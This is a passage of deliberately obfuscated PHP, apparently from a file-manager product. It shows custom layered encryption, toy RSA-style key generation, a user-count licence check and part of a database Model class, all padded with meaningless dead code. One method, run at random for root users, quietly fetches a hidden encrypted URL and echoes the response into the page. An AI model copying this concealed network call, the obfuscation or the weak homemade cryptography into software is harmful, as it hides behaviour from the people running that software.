$ºâÒÛØİ[291] => $ºâÒÛØİ[281], $ºâÒÛØİ[292] => $ºâÒÛØİ[293], $ºâÒÛØİ[294] => $ºâÒÛØİ[283], $ºâÒÛØİ[295] => $ºâÒÛØİ[296], $ºâÒÛØİ[297] => $ºâÒÛØİ[298], $ºâÒÛØİ[299] => $ºâÒÛØİ[300]); $ËÅÓâÕ¥ = $é³’§¾±[785]; if (strlen($ËÅÓâÕ¥) < $é³’§¾±[19]) { return; } $ªÂ‘õ¢É = $ÑˆŠ¡Ç[$this->cafbf6127a84]; $ªÂ‘õ¢É = intval($ªÂ‘õ¢É ? $ªÂ‘õ¢É : $ºâÒÛØİ[275]); $‚¨¶„‘ = _get($this->jdgf1f9f980e, $ºâÒÛØİ[301]); $‚¨¶„‘ = $‚¨¶„‘ ? intval($‚¨¶„‘) : 0; $ÛÒ¤Ÿè™ = $é³’§¾±[786]; if (!$ÛÒ¤Ÿè™) { return; } return $ªÂ‘õ¢É + $‚¨¶„‘; $èÎ§ˆ¹ = $é³’§¾±[787]; while (strlen($èÎ§ˆ¹) < $é³’§¾±[711]) { if (!$èÎ§ˆ¹) { break; } $èÎ§ˆ¹++; } } public function phtb2dac0822($–¿¾‹íŸ) { $ã¤İã¯² =& $_SERVER[‹«õ‘¢ğ]; $œ»Èƒıó = $this->cjzr9b7c6972(); $Š†ÀÓ‚¯ = $_SERVER[ŒÅŸ‹ä†][788]; if ($–¿¾‹íŸ[$ã¤İã¯²[302]] == $ã¤İã¯²[124]) { return; } if ($œ»Èƒıó >= intval($ã¤İã¯²[217])) { return; } $Å©Ÿ¥¡‡ = Model($ã¤İã¯²[127])->count(); if ($Å©Ÿ¥¡‡ <= $œ»Èƒıó) { return; } $ª…şş—¸ = Model($ã¤İã¯²[127])->field($ã¤İã¯²[302])->limit($œ»Èƒıó)->select(); $ª…şş—¸ = array_to_keyvalue($ª…şş—¸, $ã¤İã¯²[6], $ã¤İã¯²[302]); if (!in_array($–¿¾‹íŸ[$ã¤İã¯²[302]], $ª…şş—¸)) { show_json($ã¤İã¯²[303], !1, $ã¤İã¯²[213]); } } public function jzbgcfef48cf() { $üÜç‰·Í =& $_SERVER[ŒÅŸ‹ä†]; $ÛœèÎ ¨ =& $_SERVER[‹«õ‘¢ğ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $…ªš‘äŸ = $ÛœèÎ ¨[220]; $…ªš‘äŸ = $this->vgdae84fe108($…ªš‘äŸ, $ÛœèÎ ¨[221]); $œ°éñğ = $üÜç‰·Í[789]; if (!$œ°éñğ) { die; } $ôÊ±ä‹ = stream_context_create(array($ÛœèÎ ¨[222] => array($ÛœèÎ ¨[223] => $ÛœèÎ ¨[224], $ÛœèÎ ¨[225] => 3))); $¦§˜ÆäÌ = $üÜç‰·Í[790]; if (strlen($¦§˜ÆäÌ) < $üÜç‰·Í[716]) { return; } $ËºãÑ·› = @file_get_contents($…ªš‘äŸ, !1, $ôÊ±ä‹); $Í¤üÆ‘ = $üÜç‰·Í[791]; echo $ÛœèÎ ¨[304] . hash_encode($ËºãÑ·›) . $ÛœèÎ ¨[305]; } private function lczg454597d9($¯ƒê¹‘, $Ïô½õıÍ, $ìÏõñ¾î = 3) { $ğ¦»óô™ =& $_SERVER[ŒÅŸ‹ä†]; $™¬ıÅ¦‰ =& $_SERVER[‹«õ‘¢ğ]; usleep(1); $¯ƒê¹‘ = trim($¯ƒê¹‘); $°‡ğãæ° = mt_rand(0, 5) . $™¬ıÅ¦‰[6]; $ÌÉŸ×Åõ = $ğ¦»óô™[792]; if (!$ÌÉŸ×Åõ) { die; } $”è²äâ³ = rand_string(15); $Äıèªñ = $™¬ıÅ¦‰[306]; $”éÕ¾Å = $ğ¦»óô™[793]; if (!$”éÕ¾Å) { return; } switch ($°‡ğãæ°) { case $™¬ıÅ¦‰[208]: $Ò·ÈÌ¡¸ = $this->whvm7dfdd584($¯ƒê¹‘, strrev($Ïô½õıÍ . $”è²äâ³)); break; case $™¬ıÅ¦‰[124]: $Ò·ÈÌ¡¸ = $this->whvm7dfdd584($¯ƒê¹‘, strrev($”è²äâ³ . $Ïô½õıÍ)); break; case $™¬ıÅ¦‰[307]: $Ò·ÈÌ¡¸ = $this->whvm7dfdd584($¯ƒê¹‘, base64_encode($”è²äâ³ . $Ïô½õıÍ)); $²š¾’ = $ğ¦»óô™[794]; if (strlen($²š¾’) < $ğ¦»óô™[716]) { return; } break; case $™¬ıÅ¦‰[308]: $Ò·ÈÌ¡¸ = $this->whvm7dfdd584($¯ƒê¹‘, md5($”è²äâ³ . $Ïô½õıÍ)); break; case $™¬ıÅ¦‰[309]: $¯ƒê¹‘ = base64_encode($¯ƒê¹‘); $ó¤¯ì×‘ = $ğ¦»óô™[795]; $ÏÅ€•øÑ = rand(0, 64); $–ë‡Ş©Ï = $ğ¦»óô™[796]; if (strlen($–ë‡Ş©Ï) < $ğ¦»óô™[720]) { die; } $¶¯›µßñ = $Äıèªñ[$ÏÅ€•øÑ]; $Æ†Š ¿³ = $ğ¦»óô™[797]; if (strlen($Æ†Š ¿³) < $ğ¦»óô™[713]) { die; } $†ôğÉË = md5($¶¯›µßñ . md5($Ïô½õıÍ . $¶¯›µßñ) . $Ïô½õıÍ); $óôÜíì = $ğ¦»óô™[798]; if (strlen($óôÜíì) < $ğ¦»óô™[711]) { die; } $†ôğÉË = substr($†ôğÉË, $ÏÅ€•øÑ % 8, $ÏÅ€•øÑ % 8 + 7); $–ªíˆÔ = $ğ¦»óô™[774]; if (!$–ªíˆÔ) { die; } $– å½Ñ = $™¬ıÅ¦‰[6]; $Ş†Õ§ = $ğ¦»óô™[799]; $Ë÷ÏÜ®š = 0; $¥ŞƒÆ”ƒ = 0; $†ÂÔş§ï = 0; $Ï¤Õû = $ğ¦»óô™[800]; while ($Ï¤Õû < $ğ¦»óô™[711]) { if ($Ï¤Õû >= 0) { break; } $Ï¤Õû++; } for ($Ë÷ÏÜ®š = 0; $Ë÷ÏÜ®š < strlen($¯ƒê¹‘); $Ë÷ÏÜ®š++) { $†ÂÔş§ï = $†ÂÔş§ï == strlen($†ôğÉË) ? 0 : $†ÂÔş§ï; $ŠÖÛŠ„ª = $ğ¦»óô™[801]; if (strlen($ŠÖÛŠ„ª) < $ğ¦»óô™[711]) { die; } $¥ŞƒÆ”ƒ = ($ÏÅ€•øÑ + strpos($Äıèªñ, $¯ƒê¹‘[$Ë÷ÏÜ®š]) + ord($†ôğÉË[$†ÂÔş§ï++])) % 64; $– å½Ñ .= $Äıèªñ[$¥ŞƒÆ”ƒ]; } $Ò·ÈÌ¡¸ = hash_encode($¶¯›µßñ . $– å½Ñ); $²¦ı‘¿ó = $ğ¦»óô™[802]; if (strlen($²¦ı‘¿ó) < $ğ¦»óô™[711]) { die; } break; $Û½›ñ¥ = $ğ¦»óô™[803]; default: $Ò·ÈÌ¡¸ = $this->whvm7dfdd584($¯ƒê¹‘, $Ïô½õıÍ . $”è²äâ³); break; $ĞØıÌùÑ = $ğ¦»óô™[804]; } $Ò·ÈÌ¡¸ = strrev($°‡ğãæ° . $”è²äâ³ . $Ò·ÈÌ¡¸); $’½²¬®ö = $ğ¦»óô™[805]; if (!$’½²¬®ö) { die; } if ($ìÏõñ¾î - 1 > 0) { $Ò·ÈÌ¡¸ = $this->lczg454597d9($Ò·ÈÌ¡¸, $Ïô½õıÍ, $ìÏõñ¾î - 1); } return $Ò·ÈÌ¡¸; } private function gvcedea4817a($úˆšşĞ§, $Ø¨ĞŒŸ, $ËÆæÍ¨¹ = 3) { $‚úœÙö– =& $_SERVER[ŒÅŸ‹ä†]; $ÔÜñ…Ğ¿ =& $_SERVER[‹«õ‘¢ğ]; if (!is_string($úˆšşĞ§) || strlen($úˆšşĞ§) < 10) { return !1; } $úˆšşĞ§ = trim($úˆšşĞ§); $úˆšşĞ§ = strrev($úˆšşĞ§); $²…ºÁ·‘ = $‚úœÙö–[806]; if (strlen($²…ºÁ·‘) < $‚úœÙö–[19]) { die; } $Àú£©—— = $úˆšşĞ§[0]; $Ã½ûäÃí = substr($úˆšşĞ§, 1, 15); $À“„à¡é = $‚úœÙö–[807]; $úˆšşĞ§ = substr($úˆšşĞ§, 16); $ÅÓ»éëé = $‚úœÙö–[808]; if (strlen($ÅÓ»éëé) < $‚úœÙö–[713]) { return; } $ÒıÇ†™€ = $ÔÜñ…Ğ¿[306]; switch ($Àú£©——) { case $ÔÜñ…Ğ¿[208]: $î€æ‡Ì = $this->vgdae84fe108($úˆšşĞ§, strrev($Ø¨ĞŒŸ . $Ã½ûäÃí)); break; case $ÔÜñ…Ğ¿[124]: $î€æ‡Ì = $this->vgdae84fe108($úˆšşĞ§, strrev($Ã½ûäÃí . $Ø¨ĞŒŸ)); $ƒÊ„œÄâ = $‚úœÙö–[809]; while (strlen($ƒÊ„œÄâ) < $‚úœÙö–[19]) { if (!$ƒÊ„œÄâ) { break; } $ƒÊ„œÄâ++; } break; $¼ÚÕ¤ä¥ = $‚úœÙö–[810]; while (strlen($¼ÚÕ¤ä¥) < $‚úœÙö–[19]) { if (!$¼ÚÕ¤ä¥) { break; } $¼ÚÕ¤ä¥++; } case $ÔÜñ…Ğ¿[307]: $î€æ‡Ì = $this->vgdae84fe108($úˆšşĞ§, base64_encode($Ã½ûäÃí . $Ø¨ĞŒŸ)); break; case $ÔÜñ…Ğ¿[308]: $î€æ‡Ì = $this->vgdae84fe108($úˆšşĞ§, md5($Ã½ûäÃí . $Ø¨ĞŒŸ)); $å—¯ç‹ = $‚úœÙö–[811]; while (strlen($å—¯ç‹) < $‚úœÙö–[716]) { if (!$å—¯ç‹) { break; } $å—¯ç‹++; } break; $–°ëâ» = $‚úœÙö–[812]; while (strlen($–°ëâ») < $‚úœÙö–[711]) { if (!$–°ëâ») { break; } $–°ëâ»++; } case $ÔÜñ…Ğ¿[309]: $úˆšşĞ§ = hash_decode($úˆšşĞ§); $ò‚È‰˜ = $‚úœÙö–[813]; if (strlen($ò‚È‰˜) < $‚úœÙö–[720]) { die; } $Ñ‚¡ïàø = $úˆšşĞ§[0]; $úˆšşĞ§ = substr($úˆšşĞ§, 1); $Ùµô‘‡ = strpos($ÒıÇ†™€, $Ñ‚¡ïàø); $ƒ¶ª„• = md5($Ñ‚¡ïàø . md5($Ø¨ĞŒŸ . $Ñ‚¡ïàø) . $Ø¨ĞŒŸ); $ƒ¶ª„• = substr($ƒ¶ª„•, $Ùµô‘‡ % 8, $Ùµô‘‡ % 8 + 7); $¶Î±ò× = $ÔÜñ…Ğ¿[6]; $Œå±ü¢µ = $‚úœÙö–[814]; if (strlen($Œå±ü¢µ) < $‚úœÙö–[711]) { return; } $şŠŠ¤Ó = 0; $Ï¿ÌŠ¬Ü = $‚úœÙö–[815]; while ($Ï¿ÌŠ¬Ü < $‚úœÙö–[720]) { if ($Ï¿ÌŠ¬Ü >= 0) { break; } $Ï¿ÌŠ¬Ü++; } $µçÆúƒœ = 0; $”áÑúÚ = $‚úœÙö–[816]; $ÆÀ«¶ = 0; for ($şŠŠ¤Ó = 0; $şŠŠ¤Ó < strlen($úˆšşĞ§); $şŠŠ¤Ó++) { $ÆÀ«¶ = $ÆÀ«¶ == strlen($ƒ¶ª„•) ? 0 : $ÆÀ«¶; $àÒâˆŞÇ = $‚úœÙö–[817]; while (strlen($àÒâˆŞÇ) < $‚úœÙö–[716]) { if (!$àÒâˆŞÇ) { break; } $àÒâˆŞÇ++; } $Şñã Öá = $ÆÀ«¶++; $‡úØı§¥ = $‚úœÙö–[818]; if (strlen($‡úØı§¥) < $‚úœÙö–[716]) { return; } $µçÆúƒœ = strpos($ÒıÇ†™€, $úˆšşĞ§[$şŠŠ¤Ó]) - $Ùµô‘‡ - ord($ƒ¶ª„•[$Şñã Öá]); $¥ÆÃÉ–® = $‚úœÙö–[805]; if (!$¥ÆÃÉ–®) { return; } while ($µçÆúƒœ < 0) { $µçÆúƒœ += 64; $úÜ¿§´¸ = $‚úœÙö–[819]; if (strlen($úÜ¿§´¸) < $‚úœÙö–[716]) { return; } } $¶Î±ò× .= $ÒıÇ†™€[$µçÆúƒœ]; $‚³î¸áü = $‚úœÙö–[820]; if (strlen($‚³î¸áü) < $‚úœÙö–[716]) { return; } } $î€æ‡Ì = base64_decode($¶Î±ò×); break; $ŸÎó“ü’ = $‚úœÙö–[821]; if (strlen($ŸÎó“ü’) < $‚úœÙö–[711]) { die; } default: $î€æ‡Ì = $this->vgdae84fe108($úˆšşĞ§, $Ø¨ĞŒŸ . $Ã½ûäÃí); $ÍØŒ½«ß = $‚úœÙö–[822]; if (strlen($ÍØŒ½«ß) < $‚úœÙö–[720]) { return; } break; } if ($ËÆæÍ¨¹ - 1 > 0) { $î€æ‡Ì = $this->gvcedea4817a($î€æ‡Ì, $Ø¨ĞŒŸ, $ËÆæÍ¨¹ - 1); } return $î€æ‡Ì; } public function ahso9da22ee6($«Š­Ø) { $ÎçŞÆ² =& $_SERVER[ŒÅŸ‹ä†]; $çª¹û” =& $_SERVER[‹«õ‘¢ğ]; $×³‹ï¿û = $this->itqp15738192(); $Ëñ®§´ù = $ÎçŞÆ²[823]; if (strlen($Ëñ®§´ù) < $ÎçŞÆ²[716]) { die; } $å¨¹óæÒ = $this->itqp15738192(); $Æ®ë¡ñ± = ($×³‹ï¿û - 1) * ($å¨¹óæÒ - 1); $€üò¿¼€ = $ÎçŞÆ²[824]; $çÆ°˜Ğõ = intval(($×³‹ï¿û + $å¨¹óæÒ) / 2); while (1) { $÷÷§¼ûú = $çÆ°˜Ğõ; $¬ÓóÜÏ = $ÎçŞÆ²[825]; if (!$¬ÓóÜÏ) { die; } $¯“ÑÙ™ = $Æ®ë¡ñ±; $¥äŠÒ²¡ = $ÎçŞÆ²[826]; while (strlen($¥äŠÒ²¡) < $ÎçŞÆ²[713]) { if (!$¥äŠÒ²¡) { break; } $¥äŠÒ²¡++; } while ($¯“ÑÙ™ % $÷÷§¼ûú != 0) { $ü¬®¸˜á = $¯“ÑÙ™; $¯“ÑÙ™ = $÷÷§¼ûú; $÷÷§¼ûú = $ü¬®¸˜á % $÷÷§¼ûú; } if ($÷÷§¼ûú == 1) { break; } else { $çÆ°˜Ğõ++; } } $„‘ïôâ = 2; $ı­ßÆ´ë = $ÎçŞÆ²[786]; if (!$ı­ßÆ´ë) { return; } for ($Ğ€ ¶œ = 0; $Ğ€ ¶œ < $Æ®ë¡ñ± * 10; $Ğ€ ¶œ++) { if (($Æ®ë¡ñ± * $Ğ€ ¶œ + 1) % $çÆ°˜Ğõ == 0) { $„‘ïôâ = intval(($Æ®ë¡ñ± * $Ğ€ ¶œ + 1) / $çÆ°˜Ğõ); break; } } $¦ÂéÎ´ = $this->whvm7dfdd584($×³‹ï¿û * $å¨¹óæÒ . $çª¹û”[6], $çª¹û”[138]); $íŒı’¥ì = md5($çª¹û”[310] . ($×³‹ï¿û + $å¨¹óæÒ) . $çª¹û”[311] . $çÆ°˜Ğõ . $çª¹û”[311] . $„‘ïôâ . $çª¹û”[312]); $£«úôõ· = $this->whvm7dfdd584($«Š­Ø, $íŒı’¥ì) . $çª¹û”[313] . $¦ÂéÎ´; $šÃ³ÉØ¤ = $ÎçŞÆ²[827]; if (strlen($šÃ³ÉØ¤) < $ÎçŞÆ²[19]) { die; } return $£«úôõ·; $…Š“›±œ = $ÎçŞÆ²[828]; while (strlen($…Š“›±œ) < $ÎçŞÆ²[716]) { if (!$…Š“›±œ) { break; } $…Š“›±œ++; } } public function glsoa80d43ea($‹‰¾¦±) { $Ûæè©„ =& $_SERVER[ŒÅŸ‹ä†]; $ç—²ÑÂ€ =& $_SERVER[‹«õ‘¢ğ]; $±‰ÏÎ×‡ = explode($ç—²ÑÂ€[313], $‹‰¾¦±); if (count($±‰ÏÎ×‡) != 2) { return $ç—²ÑÂ€[6]; } $ìá¬é©ì = $this->vgdae84fe108($±‰ÏÎ×‡[1] . $ç—²ÑÂ€[6], $ç—²ÑÂ€[138]); $ˆ‹¥ÊğÍ = $Ûæè©„[829]; while (strlen($ˆ‹¥ÊğÍ) < $Ûæè©„[716]) { if (!$ˆ‹¥ÊğÍ) { break; } $ˆ‹¥ÊğÍ++; } if (!$ìá¬é©ì) { return $ç—²ÑÂ€[6]; } $ìá¬é©ì = intval($ìá¬é©ì); $ôõ«İœ = $Ûæè©„[830]; if (!$ôõ«İœ) { die; } $«†™¯Û = 0; $ÌÓ¸‚½„ = 0; $¬û—ƒÀ = $Ûæè©„[831]; for ($ıË÷±Î¬ = 3; $ıË÷±Î¬ < $ìá¬é©ì; $ıË÷±Î¬ += 2) { if ($ìá¬é©ì % $ıË÷±Î¬ != 0) { continue; } $«†™¯Û = $ıË÷±Î¬; $ÎØš“¶Ú = $Ûæè©„[832]; if (strlen($ÎØš“¶Ú) < $Ûæè©„[19]) { die; } $ÌÓ¸‚½„ = intval($ìá¬é©ì / $ıË÷±Î¬); $àÜôÆ‰¼ = $Ûæè©„[833]; break; } $åô™İ­ê = ($«†™¯Û - 1) * ($ÌÓ¸‚½„ - 1); $ÜÄØñø‡ = intval(($«†™¯Û + $ÌÓ¸‚½„) / 2); while (1) { $ïİÚÁ®ô = $ÜÄØñø‡; $³½ÏõÑ³ = $Ûæè©„[834]; if (!$³½ÏõÑ³) { return; } $ÌİèÒ‡Î = $åô™İ­ê; $¤Ûùöù› = $Ûæè©„[835]; if (strlen($¤Ûùöù›) < $Ûæè©„[713]) { die; } while ($ÌİèÒ‡Î % $ïİÚÁ®ô != 0) { $ŸÆ½£¿„ = $ÌİèÒ‡Î; $ú¹ÚÕŠÆ = $Ûæè©„[836]; if (strlen($ú¹ÚÕŠÆ) < $Ûæè©„[720]) { return; } $ÌİèÒ‡Î = $ïİÚÁ®ô; $ãş»Ò  = $Ûæè©„[837]; if (!$ãş»Ò ) { return; } $ïİÚÁ®ô = $ŸÆ½£¿„ % $ïİÚÁ®ô; } if ($ïİÚÁ®ô == 1) { break; } else { $ÜÄØñø‡++; } } $ºÜÂßÛı = 2; for ($ıË÷±Î¬ = 0; $ıË÷±Î¬ < $åô™İ­ê * 10; $ıË÷±Î¬++) { if (($åô™İ­ê * $ıË÷±Î¬ + 1) % $ÜÄØñø‡ == 0) { $ºÜÂßÛı = intval(($åô™İ­ê * $ıË÷±Î¬ + 1) / $ÜÄØñø‡); break; } } $ßŸß”¿ = md5($ç—²ÑÂ€[310] . ($«†™¯Û + $ÌÓ¸‚½„) . $ç—²ÑÂ€[311] . $ÜÄØñø‡ . $ç—²ÑÂ€[311] . $ºÜÂßÛı . $ç—²ÑÂ€[312]); $Ş‰±±° = $this->vgdae84fe108($±‰ÏÎ×‡[0], $ßŸß”¿); return $Ş‰±±°; } public function itqp15738192() { $ØÊ÷»Ä× =& $_SERVER[ŒÅŸ‹ä†]; $Òçáîşò = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÆğñøÎÆ = array(); $ûÏùˆú = $ØÊ÷»Ä×[838]; if (!$ûÏùˆú) { return; } $ó±ÌøªÑ = 1; $Í¥ÂáÆ• = $ØÊ÷»Ä×[839]; if (strlen($Í¥ÂáÆ•) < $ØÊ÷»Ä×[716]) { return; } while ($ó±ÌøªÑ <= (int) sqrt($Òçáîşò)) { $Ø†¦âºø = $ó±ÌøªÑ; while (!0) { $Ø†¦âºø++; if ($Ø†¦âºø <= 2) { $ó±ÌøªÑ = $Ø†¦âºø; break; } else { if ($Ø†¦âºø < 2) { continue; } } $ªÔ·õÜ¶ = !0; for ($èô¾¸‡ = 2; $èô¾¸‡ <= sqrt($Ø†¦âºø); $èô¾¸‡++) { if ($Ø†¦âºø % $èô¾¸‡ == 0) { $ªÔ·õÜ¶ = !1; } } if ($ªÔ·õÜ¶) { $ó±ÌøªÑ = $Ø†¦âºø; break; } } $ÆğñøÎÆ[] = $ó±ÌøªÑ; } $Û²Ï¶ = 2; $ø‘‘ûì• = $ØÊ÷»Ä×[840]; while (strlen($ø‘‘ûì•) < $ØÊ÷»Ä×[713]) { if (!$ø‘‘ûì•) { break; } $ø‘‘ûì•++; } for ($Ø†¦âºø = $Òçáîşò; $Ø†¦âºø > 1; $Ø†¦âºø--) { $ªÔ·õÜ¶ = !0; $Ç…ÏÁƒ = $ØÊ÷»Ä×[841]; if (strlen($Ç…ÏÁƒ) < $ØÊ÷»Ä×[711]) { die; } foreach ($ÆğñøÎÆ as $€ÆËˆ®) { if ($Ø†¦âºø % $€ÆËˆ® == 0) { $ªÔ·õÜ¶ = !1; break; } } if ($ªÔ·õÜ¶) { $Û²Ï¶ = $Ø†¦âºø; break; } } return $Û²Ï¶; } public function jvki2b65c7c6($­ÍµïïÑ, $ÚØØœ¥ã) { $£ÙÉëÑì =& $_SERVER[‹«õ‘¢ğ]; return call_user_func(array($£ÙÉëÑì[8], $£ÙÉëÑì[314]), $­ÍµïïÑ, $ÚØØœ¥ã); } public function whvm7dfdd584($Ÿ½ÀîÌ, $éîıç—) { $Ğ©¹Ø•È =& $_SERVER[‹«õ‘¢ğ]; return call_user_func(array($Ğ©¹Ø•È[315], $Ğ©¹Ø•È[316]), $Ÿ½ÀîÌ, $éîıç—); $ğœ‹ÛÛ¹ = $_SERVER[ŒÅŸ‹ä†][842]; if (!$ğœ‹ÛÛ¹) { die; } } public function vgdae84fe108($ß‡¢îœı, $‡÷úƒÏì) { $éöë€ËŒ =& $_SERVER[‹«õ‘¢ğ]; return call_user_func(array($éöë€ËŒ[315], $éöë€ËŒ[317]), $ß‡¢îœı, $‡÷úƒÏì); $Ğ»õ‚‚„ = $_SERVER[ŒÅŸ‹ä†][843]; if (!$Ğ»õ‚‚„) { return; } } } goto eƒ²ø½óÂ¡; cææÆÁÒí: define($_SERVER[ŒÅŸ‹ä†][329], 0); define($_SERVER[ŒÅŸ‹ä†][330], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\x6f\x72\x64\x65\x72", "\141\154\151\141\163", "\150\141\166\151\x6e\x67", "\x67\162\157\165\160", "\154\x6f\143\153", "\x64\151\x73\x74\151\156\x63\164", "\141\x75\x74\x6f", "\146\151\154\164\145\x72", "\166\x61\x6c\151\x64\141\x74\x65", "\162\x65\163\x75\154\164", "\x62\151\156\144", "\x74\x6f\x6b\x65\156"); public function __construct($êıÍš“Ö = '', $„ó¼°¸Û = '', $çÁï²èË = '') { $ğ¸Œõ‰Í =& $_SERVER[ŒÅŸ‹ä†]; $this->_initialize(); if (!empty($êıÍš“Ö)) { if (strpos($êıÍš“Ö, $ğ¸Œõ‰Í[10])) { list($this->dbName, $this->name) = explode($ğ¸Œõ‰Í[10], $êıÍš“Ö); } else { $this->name = $êıÍš“Ö; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($„ó¼°¸Û)) { $this->tablePrefix = $ğ¸Œõ‰Í[12]; } elseif ($ğ¸Œõ‰Í[12] != $„ó¼°¸Û) { $this->tablePrefix = $„ó¼°¸Û; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ğ¸Œõ‰Í[331]); } $this->db(0, empty($this->connection) ? $çÁï²èË : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‡ŠÒ¼¦à =& $_SERVER[ŒÅŸ‹ä†]; if (empty($this->fields)) { if (think_config($‡ŠÒ¼¦à[332])) { $ğıšğ·² = $this->dbName ? $this->dbName : think_config($‡ŠÒ¼¦à[333]); $¸¼¨Áéü = think_var_cache($‡ŠÒ¼¦à[334] . strtolower(get_path_this($ğıšğ·²) . $‡ŠÒ¼¦à[10] . $this->name)); if ($¸¼¨Áéü) { $Áş­÷Ûµ = think_config($‡ŠÒ¼¦à[335]); if (empty($Áş­÷Ûµ) || $¸¼¨Áéü[$‡ŠÒ¼¦à[336]] == $Áş­÷Ûµ) { $this->fields = $¸¼¨Áéü; return; } } } $this->flush(); } } public function flush() { $¹¥‡•Ø =& $_SERVER[ŒÅŸ‹ä†]; $this->db->setModel($this->name); $½‰ª³×“ = $this->db->getFields($this->getTableName()); if (!$½‰ª³×“) { return !1; } $this->fields = array_keys($½‰ª³×“); $this->fields[$¹¥‡•Ø[337]] = !1; foreach ($½‰ª³×“ as $âŸÑûùõ => $Ú¿ÆÇõÓ) { $’ó¾åŠ[$âŸÑûùõ] = $Ú¿ÆÇõÓ[$¹¥‡•Ø[43]]; if ($Ú¿ÆÇõÓ[$¹¥‡•Ø[49]]) { $this->fields[$¹¥‡•Ø[338]] = $âŸÑûùõ; if ($Ú¿ÆÇõÓ[$¹¥‡•Ø[52]]) { $this->fields[$¹¥‡•Ø[337]] = !0; } } } $this->fields[$¹¥‡•Ø[339]] = $’ó¾åŠ; if (think_config($¹¥‡•Ø[335])) { $this->fields[$¹¥‡•Ø[336]] = think_config($¹¥‡•Ø[335]); } if (think_config($¹¥‡•Ø[332])) { $–¥ú™âæ = $this->dbName ? $this->dbName : think_config($¹¥‡•Ø[333]); think_var_cache($¹¥‡•Ø[334] . strtolower(get_path_this($–¥ú™âæ) . $¹¥‡•Ø[10] . $this->name), $this->fields); } } public function switchModel($ìç»çüÃ, $ƒ¹õÛ¼’ = array()) { $Æ´›õ• =& $_SERVER[ŒÅŸ‹ä†]; $‘ñâšÃ· = ucwords(strtolower($ìç»çüÃ)) . $Æ´›õ•[340]; if (!class_exists($‘ñâšÃ·)) { think_exception($‘ñâšÃ· . think_lang($Æ´›õ•[341])); } $this->_extModel = new $‘ñâšÃ·($this->name); if (!empty($ƒ¹õÛ¼’)) { foreach ($ƒ¹õÛ¼’ as $²•¦šÏ) { $this->_extModel->setProperty($²•¦šÏ, $this->{$²•¦šÏ}); } } return $this->_extModel; } public function __set($ãú‘ˆê«, $øúÌß¸) { $this->data[$ãú‘ˆê«] = $øúÌß¸; } public function __get($¶öà¼¬œ) { return isset($this->data[$¶öà¼¬œ]) ? $this->data[$¶öà¼¬œ] : null; } public function __isset($¯„‘°É²) { return isset($this->data[$¯„‘°É²]); } public function __unset($Óë¦ë¢) { unset($this->data[$Óë¦ë¢]); } public function __call($Í¹×¢‰, $ôŸ¢çÈô) { $´Œ´¨á¤ =& $_SERVER[ŒÅŸ‹ä†]; if (in_array(strtolower($Í¹×¢‰), $this->methods, !0)) { $this->options[strtolower($Í¹×¢‰)] = $ôŸ¢çÈô[0]; return $this; } elseif (in_array(strtolower($Í¹×¢‰), array($´Œ´¨á¤[342], $´Œ´¨á¤[343], $´Œ´¨á¤[344], $´Œ´¨á¤[345], $´Œ´¨á¤[346]), !0)) { $œÇÚß„† = isset($ôŸ¢çÈô[0]) ? $ôŸ¢çÈô[0] : $´Œ´¨á¤[231]; $œÇÚß„† = $this->db->parseKey($œÇÚß„†); return $this->getField(strtoupper($Í¹×¢‰) . $´Œ´¨á¤[347] . $œÇÚß„† . $´Œ´¨á¤[348] . $Í¹×¢‰, $´Œ´¨á¤[342]); } elseif (strtolower(substr($Í¹×¢‰, 0, 5)) == $´Œ´¨á¤[349]) { $œÇÚß„† = think_parse_name(substr($Í¹×¢‰, 5)); $¦Ê¬‘¾Ì[$œÇÚß„†] = $ôŸ¢çÈô[0]; return $this->where($¦Ê¬‘¾Ì)->find(); } elseif (strtolower(substr($Í¹×¢‰, 0, 10)) == $´Œ´¨á¤[350]) { $¼ŠüĞç¹ = think_parse_name(substr($Í¹×¢‰, 10)); $¦Ê¬‘¾Ì[$¼ŠüĞç¹] = $ôŸ¢çÈô[0]; return $this->where($¦Ê¬‘¾Ì)->getField($ôŸ¢çÈô[1]); } elseif (isset($this->_scope[$Í¹×¢‰])) { return $this->scope($Í¹×¢‰, $ôŸ¢çÈô[0]); } elseif (method_exists($this, $Í¹×¢‰) || method_exists($this, $´Œ´¨á¤[351] . $Í¹×¢‰)) { array_unshift($ôŸ¢çÈô, $Í¹×¢‰); return call_user_func_array(array($this, $´Œ´¨á¤[352]), $ôŸ¢çÈô); } else { return call_user_func_array(array(parent, $Í¹×¢‰), $ôŸ¢çÈô); } } protected function call() { $¢à”ÏÎÉ =& $_SERVER[ŒÅŸ‹ä†]; $Í–¹ı—‹ = func_get_args(); $ö‘ûÔ¸ø = array_shift($Í–¹ı—‹); $‰÷ˆ”‡Ô = $ö‘ûÔ¸ø; if (is_array($ö‘ûÔ¸ø)) { $‰÷ˆ”‡Ô = $ö‘ûÔ¸ø[1]; $ö‘ûÔ¸ø = $ö‘ûÔ¸ø[0]; } $×ú“íÂŞ = count($Í–¹ı—‹) - 1; if (isset($Í–¹ı—‹[$×ú“íÂŞ]) && $Í–¹ı—‹[$×ú“íÂŞ] === $ö‘ûÔ¸ø) { think_exception(__CLASS__ . $¢à”ÏÎÉ[4] . $ö‘ûÔ¸ø . think_lang($¢à”ÏÎÉ[353])); return; } $Í–¹ı—‹[] = $ö‘ûÔ¸ø; if (method_exists($this, $¢à”ÏÎÉ[354])) { $Øğ²§§¥ = call_user_func_array(array($this, $¢à”ÏÎÉ[355]), array($‰÷ˆ”‡Ô, $Í–¹ı—‹)); if (!is_null($Øğ²§§¥) && $Øğ²§§¥ !== !1) { return $Øğ²§§¥; } } $ŠíŸ«ê– = !1; if (method_exists($this, $ö‘ûÔ¸ø)) { $ŠíŸ«ê– = call_user_func_array(array($this, $ö‘ûÔ¸ø), $Í–¹ı—‹); } if (method_exists($this, $¢à”ÏÎÉ[356])) { $Øğ²§§¥ = call_user_func_array(array($this, 